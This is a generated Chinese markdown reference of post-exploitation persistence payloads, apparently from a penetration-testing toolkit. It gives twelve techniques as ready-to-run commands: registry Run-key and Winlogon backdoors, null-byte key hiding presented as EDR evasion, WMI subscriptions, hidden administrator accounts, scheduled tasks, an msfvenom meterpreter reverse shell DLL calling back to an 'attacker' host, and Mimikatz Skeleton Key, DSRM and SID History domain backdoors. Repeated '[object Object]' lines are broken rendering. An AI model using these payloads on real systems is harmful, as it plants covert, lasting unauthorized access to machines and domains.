# 权限维持 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 注册表持久化

- **id:** `persistence-registry`
- **分类:** 权限维持 / 注册表
- **tags:** `persistence` `registry` `windows` `autorun`

通过注册表实现权限维持

**前置条件**

- 已获得目标机器权限
- 管理员权限
- Windows系统

**利用步骤**

#### Run键持久化

```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

添加Run键实现开机自启

> platform: `windows`

#### RunOnce键

```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

RunOnce键，执行一次后删除

> platform: `windows`

#### Winlogon Helper

```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

修改Userinit实现持久化

> platform: `windows`

#### 服务持久化

```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

创建服务实现持久化

> platform: `windows`

**EDR 绕过**

#### 隐藏注册表键

```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

使用空字节隐藏注册表键

**OPSEC**

- Run键是最常见的持久化方式，容易被检测
- 考虑使用更隐蔽的方式
- 定期检查注册表异常项

**教程**

[object Object]

---

### 2. WMI持久化

- **id:** `persistence-wmi`
- **分类:** 权限维持 / WMI
- **tags:** `wmi` `persistence` `windows`

通过WMI事件订阅实现持久化

**前置条件**

- 管理员权限

**利用步骤**

#### 创建事件过滤器

```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

创建WMI事件过滤器

> platform: `windows`

#### 创建事件消费者

```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

创建命令行消费者

> platform: `windows`

#### 绑定过滤器和消费者

```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```

绑定触发执行

> platform: `windows`

**教程**

[object Object]

---

### 3. 启动文件夹持久化

- **id:** `persistence-startup`
- **分类:** 权限维持 / 启动文件夹
- **tags:** `startup` `persistence` `windows`

通过启动文件夹实现持久化

**前置条件**

- 写入权限

**利用步骤**

#### 当前用户启动文件夹

```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

当前用户启动

> platform: `windows`

#### 所有用户启动文件夹

```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

所有用户启动

> platform: `windows`

**教程**

[object Object]

---

### 4. 服务持久化

- **id:** `persistence-service`
- **分类:** 权限维持 / 服务
- **tags:** `service` `persistence` `windows`

通过创建服务实现持久化

**前置条件**

- 管理员权限

**利用步骤**

#### 创建服务

```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```

创建自启动服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `sc create` | 创建服务命令 | command |
| `binPath=` | 服务执行路径 | parameter |
| `start= auto` | 自动启动 | parameter |

> platform: `windows`

#### 启动服务

```
sc start evilsvc
```

启动服务

> platform: `windows`

**教程**

[object Object]

---

### 5. DLL注入持久化

- **id:** `persistence-dll-injection`
- **分类:** 权限维持 / DLL注入
- **tags:** `dll` `injection` `persistence`

通过DLL注入实现持久化

**前置条件**

- 代码执行权限
- 目标进程

**利用步骤**

#### 创建恶意DLL

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

生成恶意DLL

> platform: `linux`

#### 注入DLL

```
使用工具如InjectDLL、PowerShell等注入到目标进程
```

将DLL注入到运行进程

> platform: `windows`

#### AppInit_DLLs

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```

通过AppInit_DLLs注入

> platform: `windows`

**教程**

[object Object]

---

### 6. 后门用户

- **id:** `persistence-backdoor-user`
- **分类:** 权限维持 / 用户
- **tags:** `user` `backdoor` `persistence`

创建后门用户账户

**前置条件**

- 管理员权限

**利用步骤**

#### 创建用户

```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

创建管理员用户

> platform: `windows`

#### 隐藏用户

```
net user backdoor$ P@ssw0rd /add
```

创建隐藏用户（$结尾）

> platform: `windows`

#### 修改注册表隐藏

```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```

通过注册表隐藏用户

> platform: `windows`

**教程**

[object Object]

---

### 7. 隐藏用户

- **id:** `persistence-hidden-user`
- **分类:** 权限维持 / 隐藏用户
- **tags:** `hidden` `user` `persistence`

创建隐藏的管理员用户

**前置条件**

- SYSTEM权限

**利用步骤**

#### 创建用户

```
net user hidden$ P@ssw0rd /add
```

创建$结尾用户

> platform: `windows`

#### 添加到管理员组

```
net localgroup administrators hidden$ /add
```

添加管理员权限

> platform: `windows`

#### 注册表隐藏

```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
修改F值
reg import user.reg
```

通过注册表完全隐藏

> platform: `windows`

**教程**

[object Object]

---

### 8. 计划任务持久化

- **id:** `persistence-scheduled`
- **分类:** 权限维持 / 计划任务
- **tags:** `persistence` `scheduled` `task`

通过计划任务实现持久化

**前置条件**

- 创建任务权限

**利用步骤**

#### 创建登录任务

```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```

创建登录时运行的任务

| 片段 | 说明 | 类型 |
|---|---|---|
| `/tn` | 任务名称 | parameter |
| `/tr` | 执行的程序 | parameter |
| `/sc onlogon` | 触发条件：登录时 | parameter |
| `/ru SYSTEM` | 运行用户：SYSTEM | parameter |

> platform: `windows`

#### 创建定时任务

```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

创建每5分钟运行的任务

> platform: `windows`

#### PowerShell创建

```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

使用PowerShell创建任务

> platform: `windows`

#### Linux Cron

```
crontab -e
添加: * * * * * /tmp/backdoor.sh
或: @reboot /tmp/backdoor.sh
```

Linux计划任务

> platform: `linux`

**教程**

[object Object]

---

### 9. Skeleton Key后门

- **id:** `skeleton-key`
- **分类:** 权限维持 / 域后门
- **tags:** `skeleton-key` `backdoor` `domain`

在域控制器植入万能密码

**前置条件**

- 域管理员权限
- 访问域控制器

**利用步骤**

#### 植入Skeleton Key

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

使用Mimikatz植入

| 片段 | 说明 | 类型 |
|---|---|---|
| `misc::skeleton` | 植入万能密码模块 | command |

> platform: `windows`

#### 使用万能密码

```
万能密码: mimikatz
任何域用户都可以使用mimikatz作为密码登录
```

使用万能密码登录

> platform: `windows`

#### 检测方法

```
检查LSASS内存:
Get-Process lsass
使用EDR检测内存注入
```

检测Skeleton Key

> platform: `windows`

**教程**

[object Object]

---

### 10. DSRM后门

- **id:** `dsrm-backdoor`
- **分类:** 权限维持 / 域后门
- **tags:** `dsrm` `backdoor` `domain`

利用DSRM账户建立后门

**前置条件**

- 域管理员权限
- 访问域控制器

**利用步骤**

#### 获取DSRM密码

```
mimikatz # lsadump::lsa /patch /name:krbtgt
或
mimikatz # token::elevate
mimikatz # lsadump::sam
```

获取DSRM账户哈希

> platform: `windows`

#### 同步DSRM密码

```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```

同步DSRM密码与域管理员

| 片段 | 说明 | 类型 |
|---|---|---|
| `ntdsutil` | AD数据库工具 | command |
| `sync from domain account` | 同步域账户密码 | keyword |

> platform: `windows`

#### 启用DSRM账户

```
修改注册表:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

允许DSRM账户远程登录

> platform: `windows`

#### 使用DSRM登录

```
使用DSRM账户哈希:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
或使用Pass-the-Hash
```

使用DSRM账户

> platform: `windows`

**教程**

[object Object]

---

### 11. SID History后门

- **id:** `sid-history`
- **分类:** 权限维持 / 域后门
- **tags:** `sid-history` `backdoor` `domain`

利用SID History建立后门

**前置条件**

- 域管理员权限

**利用步骤**

#### 添加SID History

```
mimikatz # sid::add /sam:backdoor_user /new:administrator
将域管SID添加到普通用户
```

添加SID History

| 片段 | 说明 | 类型 |
|---|---|---|
| `sid::add` | 添加SID History | command |
| `/sam` | 目标用户 | parameter |
| `/new` | 要添加的SID | parameter |

> platform: `windows`

#### 验证SID History

```
Get-ADUser backdoor_user -Properties sidHistory
或
whoami /all
```

检查SID History

> platform: `windows`

#### 使用后门

```
使用backdoor_user登录
自动获得域管理员权限
```

使用后门账户

> platform: `windows`

**教程**

[object Object]

---

### 12. 进程镂空持久化

- **id:** `persistence-process-hollowing`
- **分类:** 权限维持 / 进程注入
- **tags:** `process-hollowing` `persistence` `injection`

利用进程镂空技术实现持久化

**前置条件**

- 代码执行权限

**利用步骤**

#### 进程镂空原理

```
1. 创建合法进程(挂起状态)
2. 替换进程内存
3. 恢复执行
```

进程镂空原理

> platform: `windows`

#### C#实现

```
using System.Runtime.InteropServices;
// 创建挂起进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// 替换内存
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

C#进程镂空

> platform: `windows`

#### 检测方法

```
检查进程内存:
- 进程路径与内存内容不匹配
- 异常的内存区域
- 使用EDR检测
```

检测进程镂空

> platform: `windows`

**教程**

[object Object]
